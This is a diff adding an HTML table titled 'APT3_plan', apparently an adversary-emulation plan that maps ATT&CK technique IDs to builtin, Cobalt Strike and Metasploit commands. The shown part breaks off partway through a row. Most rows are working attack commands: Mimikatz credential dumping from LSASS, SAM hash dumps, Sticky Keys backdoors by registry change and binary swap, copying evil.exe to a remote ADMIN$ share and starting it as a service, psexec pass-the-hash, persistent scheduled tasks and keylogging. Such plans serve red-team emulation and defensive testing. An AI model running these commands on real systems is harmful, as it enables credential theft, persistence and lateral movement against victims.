@@ -1,0 +1,753 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html" charset="utf-8">
+<title>APT3_plan</title>
+<style type="text/css"><!--
+div.cell { width: 100%; overflow: hidden; position: relative;}
+table { border-collapse: collapse; table-layout: fixed; }
+table td { overflow: hidden; padding: 0px;}
+body { margin: 8px; }
+.CellStyle_0
+{
+color: #FFFFFF;
+font-family: Tahoma;
+font-size: 9pt;
+mso-font-charset: 1;
+border-left: 1px solid #A0A0A0;
+border-top: 1px solid #A0A0A0;
+border-right: 1px solid #A0A0A0;
+border-bottom: 1px solid #A0A0A0;
+background-color: #303440;text-align: left;
+vertical-align: middle;
+}
+.CellStyle_1
+{
+color: #000000;
+font-family: Microsoft Sans Serif;
+font-size: 9pt;
+mso-font-charset: 1;
+border-left: 1px solid #A0A0A0;
+border-top: 1px solid #A0A0A0;
+border-right: 1px solid #A0A0A0;
+border-bottom: 1px solid #A0A0A0;
+background-color: #A6CAF0;text-align: left;
+vertical-align: middle;
+}
+.CellStyle_2
+{
+color: #FFFFFF;
+font-family: Microsoft Sans Serif;
+font-size: 9pt;
+mso-font-charset: 1;
+border-left: 1px solid #A0A0A0;
+border-top: 1px solid #A0A0A0;
+border-right: 1px solid #A0A0A0;
+border-bottom: 1px solid #A0A0A0;
+background-color: #FA8072;text-align: left;
+vertical-align: middle;
+}
+--></style>
+</head>
+<body>
+<table border="0" cellspacing="0" width="2071px" bgcolor="#292D37">
+<col width="455px"/>
+<col width="196px"/>
+<col width="557px"/>
+<col width="553px"/>
+<col width="310px"/>
+<tr height="35px">
+<td class="CellStyle_0"><div class="cell">Name</div></td>
+<td class="CellStyle_0"><div class="cell">Framework</div></td>
+<td class="CellStyle_0"><div class="cell">Description</div></td>
+<td class="CellStyle_0"><div class="cell">Implementation</div></td>
+<td class="CellStyle_0"><div class="cell">Techniques</div></td>
+</tr>
+<tr height="130px">
+<td class="CellStyle_1"><div class="cell">Dump credentials from LSASS</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">This technique injects into the LSASS.exe process and scrapes its memory for plaintext passwords of logged on users. You must do this from a high integrity process. <br/>The Mimikatz project has a lot of different capabilities (https://github.com/gentilkiwi/mimikatz/wiki) such as pass-the-hash, pass-the-ticket, creating silver/golden tickets, dumping credentials, and elevating a process.</div></td>
+<td class="CellStyle_2"><div class="cell">logonpasswords<br/>mimikatz !sekurlsa::logonpasswords<br/>mimikatz !sekurlsa::msv<br/>mimikatz !sekurlsa::kerberos<br/>mimikatz !sekurlsa::wdigest</div></td>
+<td class="CellStyle_2"><div class="cell">T1003</div></td>
+</tr>
+<tr height="130px">
+<td class="CellStyle_1"><div class="cell">Dump credentials from LSASS</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">This technique injects into the LSASS.exe process and scrapes its memory for plaintext passwords of logged on users. You must do this from a high integrity process. <br/>The Mimikatz project has a lot of different capabilities (https://github.com/gentilkiwi/mimikatz/wiki) such as pass-the-hash, pass-the-ticket, creating silver/golden tickets, dumping credentials, and elevating a process.</div></td>
+<td class="CellStyle_2"><div class="cell">use mimikatz<br/>wdigest<br/>msv<br/>kerberos<br/>logonpasswords</div></td>
+<td class="CellStyle_2"><div class="cell">T1003</div></td>
+</tr>
+<tr height="55px">
+<td class="CellStyle_1"><div class="cell">Dumps hashes from the SAM Hive file</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Dumps hashes from the SAM Hive file.</div></td>
+<td class="CellStyle_2"><div class="cell">hashdump<br/>mimikatz !lsadump::sam</div></td>
+<td class="CellStyle_2"><div class="cell">T1003</div></td>
+</tr>
+<tr height="105px">
+<td class="CellStyle_1"><div class="cell">Dumps hashes from the SAM Hive file</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Dumps hashes from the SAM Hive file.</div></td>
+<td class="CellStyle_2"><div class="cell">hashdump<br/>run hashdump<br/>run smart_hashdump<br/>post/windows/gather/credentials/domain_hashdump</div></td>
+<td class="CellStyle_2"><div class="cell">T1003</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Check terminal services</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Check for the current registry value for terminal services, if it's 0, then terminal services are enabled. If it's 1, then they're disabled</div></td>
+<td class="CellStyle_2"><div class="cell">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</div></td>
+<td class="CellStyle_2"><div class="cell">T1012</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Check terminal services</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Check for the current registry value for terminal services, if it's 0, then terminal services are enabled. If it's 1, then they're disabled</div></td>
+<td class="CellStyle_2"><div class="cell">shell reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</div></td>
+<td class="CellStyle_2"><div class="cell">T1012</div></td>
+</tr>
+<tr height="55px">
+<td class="CellStyle_1"><div class="cell">Check terminal services</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Check for the current registry value for terminal services, if it's 0, then terminal services are enabled. If it's 1, then they're disabled</div></td>
+<td class="CellStyle_2"><div class="cell">reg queryval -k &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; -v fDenyTSConnections<br/>post/windows/gather/enum_termserv</div></td>
+<td class="CellStyle_2"><div class="cell">T1012</div></td>
+</tr>
+<tr height="55px">
+<td class="CellStyle_1"><div class="cell">Point sethc.exe file to cmd.exe</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Modify the registry to point the sethc.exe file to point to cmd.exe</div></td>
+<td class="CellStyle_2"><div class="cell">Sticky Keys Persistence via Registry Manipulations:<br/>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot; /f</div></td>
+<td class="CellStyle_2"><div class="cell">T1015</div></td>
+</tr>
+<tr height="55px">
+<td class="CellStyle_1"><div class="cell">Point sethc.exe file to cmd.exe</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Modify the registry to point the sethc.exe file to point to cmd.exe</div></td>
+<td class="CellStyle_2"><div class="cell">Sticky Keys Persistence via Registry Manipulations:<br/>shell REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot; /f</div></td>
+<td class="CellStyle_2"><div class="cell">T1015</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Point sethc.exe file to cmd.exe</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Modify the registry to point the sethc.exe file to point to cmd.exe</div></td>
+<td class="CellStyle_2"><div class="cell">post/windows/manage/sticky_keys</div></td>
+<td class="CellStyle_2"><div class="cell">T1015</div></td>
+</tr>
+<tr height="105px">
+<td class="CellStyle_1"><div class="cell">Replace real sethc.exe with a copy of cmd.exe</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Remove the real sethc.exe and replace it with a copy of cmd.exe. You can also just move the original sethc.exe to a different file if you don't want to delete it</div></td>
+<td class="CellStyle_2"><div class="cell">Sticky Keys Persistence via binary swapping:<br/>takeown.exe C:\Windows\system32\sethc.exe<br/>del C:\Windows\system32\sethc.exe<br/>copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe</div></td>
+<td class="CellStyle_2"><div class="cell">T1015</div></td>
+</tr>
+<tr height="105px">
+<td class="CellStyle_1"><div class="cell">Replace real sethc.exe with a copy of cmd.exe</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Remove the real sethc.exe and replace it with a copy of cmd.exe. You can also just move the original sethc.exe to a different file if you don't want to delete it</div></td>
+<td class="CellStyle_2"><div class="cell">Sticky Keys Persistence via binary swapping:<br/>shell takeown.exe C:\Windows\system32\sethc.exe<br/>shell del C:\Windows\system32\sethc.exe<br/>shell copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe</div></td>
+<td class="CellStyle_2"><div class="cell">T1015</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get network information</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Get information about the domain, network adapters, DNS / WSUS servers</div></td>
+<td class="CellStyle_2"><div class="cell">ipconfig /all</div></td>
+<td class="CellStyle_2"><div class="cell">T1016</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get network information</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Get information about the domain, network adapters, DNS / WSUS servers</div></td>
+<td class="CellStyle_2"><div class="cell">shell ipconfig</div></td>
+<td class="CellStyle_2"><div class="cell">T1016</div></td>
+</tr>
+<tr height="55px">
+<td class="CellStyle_1"><div class="cell">Get network information</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Get information about the domain, network adapters, DNS / WSUS servers</div></td>
+<td class="CellStyle_2"><div class="cell">ipconfig<br/>post/windows/gather/enum_domains</div></td>
+<td class="CellStyle_2"><div class="cell">T1016</div></td>
+</tr>
+<tr height="55px">
+<td class="CellStyle_1"><div class="cell">Get ARP table</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Display the ARP table</div></td>
+<td class="CellStyle_2"><div class="cell">arp -a<br/>route print</div></td>
+<td class="CellStyle_2"><div class="cell">T1016</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get ARP table</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Display the ARP table</div></td>
+<td class="CellStyle_2"><div class="cell">shell arp -a</div></td>
+<td class="CellStyle_2"><div class="cell">T1016</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get ARP table</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Display the ARP table</div></td>
+<td class="CellStyle_2"><div class="cell">route</div></td>
+<td class="CellStyle_2"><div class="cell">T1016</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Dump MAC, IP addresses and codes</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Used to get the MAC and IP addresses as well as some descriptive codes for machines (0x1C indicates a domain controller)</div></td>
+<td class="CellStyle_2"><div class="cell">nbtstat -a {IP | COMP_NAME }</div></td>
+<td class="CellStyle_2"><div class="cell">T1016</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Dump MAC, IP addresses and codes</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Used to get the MAC and IP addresses as well as some descriptive codes for machines (0x1C indicates a domain controller)</div></td>
+<td class="CellStyle_2"><div class="cell">shell c:\windows\sysnative\nbstat.exe -a {IP | COMP_NAME}</div></td>
+<td class="CellStyle_2"><div class="cell">T1016</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get the list of domain computers</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Display the list of domain computers in the domain by showing their computer accounts (COMP_NAME$)</div></td>
+<td class="CellStyle_2"><div class="cell">net group &quot;Domain Computers&quot; /domain[:DOMAIN]</div></td>
+<td class="CellStyle_2"><div class="cell">T1018</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get the list of domain computers</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Display the list of domain computers in the domain by showing their computer accounts (COMP_NAME$)</div></td>
+<td class="CellStyle_2"><div class="cell">net group &quot;Domain Computers&quot; /domain</div></td>
+<td class="CellStyle_2"><div class="cell">T1018</div></td>
+</tr>
+<tr height="80px">
+<td class="CellStyle_1"><div class="cell">Get the list of domain computers</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Display the list of domain computers in the domain by showing their computer accounts (COMP_NAME$)</div></td>
+<td class="CellStyle_2"><div class="cell"><br/>post/windows/gather/enum_ad_computers<br/>post/windows/gather/enum_computers</div></td>
+<td class="CellStyle_2"><div class="cell">T1018</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get the list of domain controllers</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Display the list of domain controllers in the network</div></td>
+<td class="CellStyle_2"><div class="cell">net group &quot;Domain Controllers&quot; /domain[:DOMAIN]</div></td>
+<td class="CellStyle_2"><div class="cell">T1018</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get the list of domain controllers</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Display the list of domain controllers in the network</div></td>
+<td class="CellStyle_2"><div class="cell">net group &quot;Domain Controllers&quot; /domain</div></td>
+<td class="CellStyle_2"><div class="cell">T1018</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Display trust relationship with domain controller</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Display the trust relationship between the workstation and the domain - must be elevated to use this!</div></td>
+<td class="CellStyle_2"><div class="cell">nltest /dclist[:domain]</div></td>
+<td class="CellStyle_2"><div class="cell">T1018</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Display the login server</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Display the active directory login server of the workstation</div></td>
+<td class="CellStyle_2"><div class="cell">echo %LOGONSERVER%</div></td>
+<td class="CellStyle_2"><div class="cell">T1018</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Display the login server</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Display the active directory login server of the workstation</div></td>
+<td class="CellStyle_2"><div class="cell">shell echo %LOGONSERVER%</div></td>
+<td class="CellStyle_2"><div class="cell">T1018</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get user information</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Get current user information, SID, domain, groups the user belongs to, security privs of the user</div></td>
+<td class="CellStyle_2"><div class="cell">whoami /all /fo list</div></td>
+<td class="CellStyle_2"><div class="cell">T1033</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get user information</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Get current user information, SID, domain, groups the user belongs to, security privs of the user</div></td>
+<td class="CellStyle_2"><div class="cell">shell whoami /all /fo list</div></td>
+<td class="CellStyle_2"><div class="cell">T1033</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get user information</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Get current user information, SID, domain, groups the user belongs to, security privs of the user</div></td>
+<td class="CellStyle_2"><div class="cell">getuid</div></td>
+<td class="CellStyle_2"><div class="cell">T1033</div></td>
+</tr>
+<tr height="105px">
+<td class="CellStyle_1"><div class="cell">Check for common privilege escalation methods</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">PowerUp.ps1 is a powershell script from the PowerSploit project on github by PowershellMafia. The Invoke-AllChecks commandlet checks for many common privilege escalation options such as unquoted service paths, writeable service directories, service information manipulation, always install elevated, etc. Each specific kind of escalation technique supplies its own method of abusing it.</div></td>
+<td class="CellStyle_2"><div class="cell">Check for common privilege escalation methods:<br/>*upload PowerUp.ps1 to victim disk*<br/>powershell.exe -epbypass PowerUp.ps1<br/>Invoke-AllChecks</div></td>
+<td class="CellStyle_2"><div class="cell">T1058<br/>T1034<br/>T1044<br/>T1038</div></td>
+</tr>
+<tr height="105px">
+<td class="CellStyle_1"><div class="cell">Check for common privilege escalation methods</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">PowerUp.ps1 is a powershell script from the PowerSploit project on github by PowershellMafia. The Invoke-AllChecks commandlet checks for many common privilege escalation options such as unquoted service paths, writeable service directories, service information manipulation, always install elevated, etc. Each specific kind of escalation technique supplies its own method of abusing it.</div></td>
+<td class="CellStyle_2"><div class="cell">powershell-import /path/to/PowerUp.ps1<br/>powershell Invoke-AllChecks</div></td>
+<td class="CellStyle_2"><div class="cell">T1058<br/>T1034<br/>T1044<br/>T1038</div></td>
+</tr>
+<tr height="105px">
+<td class="CellStyle_1"><div class="cell">Check for common privilege escalation methods</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">PowerUp.ps1 is a powershell script from the PowerSploit project on github by PowershellMafia. The Invoke-AllChecks commandlet checks for many common privilege escalation options such as unquoted service paths, writeable service directories, service information manipulation, always install elevated, etc. Each specific kind of escalation technique supplies its own method of abusing it.</div></td>
+<td class="CellStyle_2"><div class="cell">exploit/windows/local/trusted_service_path</div></td>
+<td class="CellStyle_2"><div class="cell">T1058<br/>T1034<br/>T1044<br/>T1038</div></td>
+</tr>
+<tr height="130px">
+<td class="CellStyle_1"><div class="cell">Create a new service remotely</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">This technique creates a new service on the remote machine. It's important to note the spaces after the = in these commands! Also, before starting the service, run the following commands to make sure everything is set up properly:<br/>sc \\COMP qc acachsrv<br/>dir \\COMP\ADMIN$\acachsrv.exe</div></td>
+<td class="CellStyle_2"><div class="cell">Creating a new service remotely:<br/>net use \\COMP\ADMIN$ &quot;password&quot; /user:DOMAIN_NAME\UserName<br/>copy evil.exe \\COMP\ADMIN$\System32\acachsrv.exe<br/>sc \\COMP create acachsrv binPath= &quot;C:\Windows\System32\acachsrv.exe&quot; start= auto  DisplayName= &quot;DisplayName&quot;<br/>sc \\COMP start acachsrv</div></td>
+<td class="CellStyle_2"><div class="cell">T1035<br/>T1077</div></td>
+</tr>
+<tr height="130px">
+<td class="CellStyle_1"><div class="cell">Create a new service remotely</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">This technique creates a new service on the remote machine. It's important to note the spaces after the = in these commands! Also, before starting the service, run the following commands to make sure everything is set up properly:<br/>sc \\COMP qc acachsrv<br/>dir \\COMP\ADMIN$\acachsrv.exe</div></td>
+<td class="CellStyle_2"><div class="cell">Creating a new service remotely:<br/>shell net use \\COMP\ADMIN$ &quot;password&quot; /user:DOMAIN_NAME\UserName<br/>shell copy evil.exe \\COMP\ADMIN$\acachsrv.exe<br/>shell sc \\COMP create acachsrv binPath= &quot;C:\Windows\System32\acachsrv.exe&quot; start= auto description= &quot;Description here&quot; DisplayName= &quot;DisplayName&quot;<br/>shell sc \\COMP start acachsrv</div></td>
+<td class="CellStyle_2"><div class="cell">T1035<br/>T1077</div></td>
+</tr>
+<tr height="130px">
+<td class="CellStyle_1"><div class="cell">Create a new service remotely (using psexec)</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">psexec copies over a file to the remote box via SMB, then creates a service (usually a randomly named one) which points to the binary that was just copied over, starts the service, then deletes the service. Depending on the version of psexec, it might also migrate out of the initial process and delete the file that was copied over too. This is very similar to the previously mentioned technique of creating a service remotely, but the operator has much less control over the parameters</div></td>
+<td class="CellStyle_2"><div class="cell">psexec is part of the SysInternals suite. It's not on systems by default, but it is likely to be a trusted executable, especially on sysadmin boxes where other SysInternals tools already exist:<br/><br/>psexec /accepteula \\ip -u domain\user -p password -c -f \\smbip\share\file.exe (Copy and execute file.exe on the remote system)<br/>psexec /accepteula \\ip -u domain\user -p  lm:ntlm cmd.exe /c dir c:\Progra~1 (Run cmd.exe on the remote system using the lm:ntlm password hash - aka pass the hash)<br/>psexec /accepteula \\ip -s cmd.exe (Run cmd.exe on the remote box as the SYSTEM user account)</div></td>
+<td class="CellStyle_2"><div class="cell">T1035<br/>T1077</div></td>
+</tr>
+<tr height="55px">
+<td class="CellStyle_1"><div class="cell">Create a new service remotely (using psexec)</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">psexec copies over a file to the remote box via SMB, then creates a service (usually a randomly named one) which points to the binary that was just copied over, starts the service, then deletes the service. Depending on the version of psexec, it might also migrate out of the initial process and delete the file that was copied over too. This is very similar to the previously mentioned technique of creating a service remotely, but the operator has much less control over the parameters</div></td>
+<td class="CellStyle_2"><div class="cell">psexec COMP_NAME {listener name} (via sc)<br/>psexec_sh COMP_NAME {listener name} (via powershell)</div></td>
+<td class="CellStyle_2"><div class="cell">T1035<br/>T1077</div></td>
+</tr>
+<tr height="155px">
+<td class="CellStyle_1"><div class="cell">Create a new service remotely (using psexec)</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">psexec copies over a file to the remote box via SMB, then creates a service (usually a randomly named one) which points to the binary that was just copied over, starts the service, then deletes the service. Depending on the version of psexec, it might also migrate out of the initial process and delete the file that was copied over too. This is very similar to the previously mentioned technique of creating a service remotely, but the operator has much less control over the parameters</div></td>
+<td class="CellStyle_2"><div class="cell">PSEXEC Modules:<br/>exploit/windows/smb/psexec<br/>exploit/windows/local/current_user_psexec<br/>auxiliary/admin/smb/psexec_command<br/>auxiliary/scanner/smb/psexec_loggedin_users<br/>exploit/windows/smb/psexec_psh</div></td>
+<td class="CellStyle_2"><div class="cell">T1035<br/>T1077</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get current TCP/IP connections</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Display current TCP/IP network connections (b requires elevated privs so you can see the process that opened the connection)</div></td>
+<td class="CellStyle_2"><div class="cell">netstat -ano[b]</div></td>
+<td class="CellStyle_2"><div class="cell">T1049</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get current TCP/IP connections</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Display current TCP/IP network connections (b requires elevated privs so you can see the process that opened the connection)</div></td>
+<td class="CellStyle_2"><div class="cell">shell c:\windows\sysnative\netstat.exe -ano[b]</div></td>
+<td class="CellStyle_2"><div class="cell">T1049</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Get current TCP/IP connections</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Display current TCP/IP network connections (b requires elevated privs so you can see the process that opened the connection)</div></td>
+<td class="CellStyle_2"><div class="cell">post/windows/gather/tcpnetstat</div></td>
+<td class="CellStyle_2"><div class="cell">T1049</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Display active SMB sessions</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Display the list of active SMB sessions on the workstation so you can see which users have active connections.</div></td>
+<td class="CellStyle_2"><div class="cell">net session | find / &quot;\\&quot;</div></td>
+<td class="CellStyle_2"><div class="cell">T1049</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Display active SMB sessions</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Display the list of active SMB sessions on the workstation so you can see which users have active connections.</div></td>
+<td class="CellStyle_2"><div class="cell">shell net session | find / &quot;\\&quot;</div></td>
+<td class="CellStyle_2"><div class="cell">T1049</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Display active SMB sessions</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Display the list of active SMB sessions on the workstation so you can see which users have active connections.</div></td>
+<td class="CellStyle_2"><div class="cell">post/windows/gather/enum_logged_on_users</div></td>
+<td class="CellStyle_2"><div class="cell">T1049</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Display all currently scheduled tasks</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Displays all of the currently scheduled tasks to be run on a computer</div></td>
+<td class="CellStyle_2"><div class="cell">schtasks [/s HOSTNAME]</div></td>
+<td class="CellStyle_2"><div class="cell">T1053</div></td>
+</tr>
+<tr height="30px">
+<td class="CellStyle_1"><div class="cell">Display all currently scheduled tasks</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Displays all of the currently scheduled tasks to be run on a computer</div></td>
+<td class="CellStyle_2"><div class="cell">shell schtasks</div></td>
+<td class="CellStyle_2"><div class="cell">T1053</div></td>
+</tr>
+<tr height="130px">
+<td class="CellStyle_1"><div class="cell">Create a scheduled task</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Add scheduled task (/s is name/ip of remote system to do this on; /tn is the name of the task; /sc is when to run; /ru is user to runas; /rp is password for that user)<br/>may need to make sure that the schedule service is started and configured to run on boot so that your persistence sticks.<br/>Delete a scheduled task by name:<br/>schtasks [/s HOSTNAME] /delete /tn &quot;name&quot;</div></td>
+<td class="CellStyle_2"><div class="cell">Creating a scheduled task:<br/>schtasks [/S HOSTNAME] /create /tn &quot;acachesrv&quot; /tr C:\file\path\here.exe /sc ONLOGON /ru &quot;System&quot; [/rp password]<br/>Requirements for running scheduled tasks:<br/>net start schedule<br/>sc config schedule start= auto</div></td>
+<td class="CellStyle_2"><div class="cell">T1053</div></td>
+</tr>
+<tr height="130px">
+<td class="CellStyle_1"><div class="cell">Create a scheduled task</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Add scheduled task (/s is name/ip of remote system to do this on; /tn is the name of the task; /sc is when to run; /ru is user to runas; /rp is password for that user)<br/>may need to make sure that the schedule service is started and configured to run on boot so that your persistence sticks.<br/>Delete a scheduled task by name:<br/>schtasks [/s HOSTNAME] /delete /tn &quot;name&quot;</div></td>
+<td class="CellStyle_2"><div class="cell">Creating a scheduled task:<br/>shell schtasks [/S HOSTNAME] /create /tn &quot;acachesrv&quot; /tr C:\file\path\here.exe /sc ONLOGON /ru &quot;System&quot; [/rp password]<br/>Requirements for running scheduled tasks:<br/>shell net start schedule<br/>shell sc config schedule start= auto</div></td>
+<td class="CellStyle_2"><div class="cell">T1053</div></td>
+</tr>
+<tr height="155px">
+<td class="CellStyle_1"><div class="cell">Start a keylogger</div></td>
+<td class="CellStyle_2"><div class="cell">metasploit</div></td>
+<td class="CellStyle_2"><div class="cell">Keylogging is extremely useful to get credentials and other information from the victim, but make sure that you are keylogging in a process belonging to the user you want to spy on. Keylogging within a SYSTEM process will not get you the keystrokes of other users on the system. For Cobalt Strike, make sure you specifiy the correct architecture and PID for a process running as the target victim. For Metasploit, make sure you've migrated to a process that is running as the target victim (explore.exe is always good).</div></td>
+<td class="CellStyle_2"><div class="cell">starting the keylogger:<br/>keyscan_start<br/>when you're ready to get the logs:<br/>keyscan_dump<br/>when you're done keylogging:<br/>keyscan_stop</div></td>
+<td class="CellStyle_2"><div class="cell">T1056</div></td>
+</tr>
+<tr height="80px">
+<td class="CellStyle_1"><div class="cell">Enumerate running processes</div></td>
+<td class="CellStyle_2"><div class="cell">builtin</div></td>
+<td class="CellStyle_2"><div class="cell">Display list of currently running processes and services on the system</div></td>
+<td class="CellStyle_2"><div class="cell">tasklist /v [/svc]<br/>net start<br/>qprocess *</div></td>
+<td class="CellStyle_2"><div class="cell">T1057</div></td>
+</tr>
+<tr height="80px">
+<td class="CellStyle_1"><div class="cell">Enumerate running processes</div></td>
+<td class="CellStyle_2"><div class="cell">cobalt-strike</div></td>
+<td class="CellStyle_2"><div class="cell">Display list of currently running processes and services on the system</div></td>
+<td class="CellStyle_2"><div class="cell">ps<br/>shell tasklist /v [/svc]<br/>shell net start</div></td>
+<td class="CellStyle_2"><div class="cell">T1057</div></td>
+</tr>
+<tr height="55px">
+<td class="CellStyle_1"><div class="cell">Enumerate running processes</div></td>
